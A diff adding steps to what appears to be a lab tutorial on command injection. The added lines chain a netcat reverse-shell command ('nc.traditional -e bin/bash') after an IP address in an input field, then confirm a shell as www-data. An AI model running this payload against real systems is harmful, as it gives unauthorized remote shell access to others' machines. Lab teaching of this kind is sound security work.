@@ -28,4 +28,16 @@
         * -p specifies port number<br>
         <img src="./images/05.listening_port.png"></img>
     *  Listening port would be used to listen to any connection coming to our PC.
-     
+ * Typing the following command would allow us to connect to victim's machine:<br>
+ ```
+ <your-ip-address>;nc.traditional -e bin/bash <ip-address-of-machine-to-which-you-want-to-connect>
+ ```
+* There would be **no output** once you perform this command line injection.<br><br>
+<img src="./images/06.command_injection_02.png"></img>
+* Once you submit, **go back to kali linux** and you would see the following output:<br>
+<img src="./images/07.command_injection_output.png"></img>
+* If you type the **command `whoami`,** you should see `www -data`<br>
+<img src="./images/08.whoami.png"></img>
+
+
+
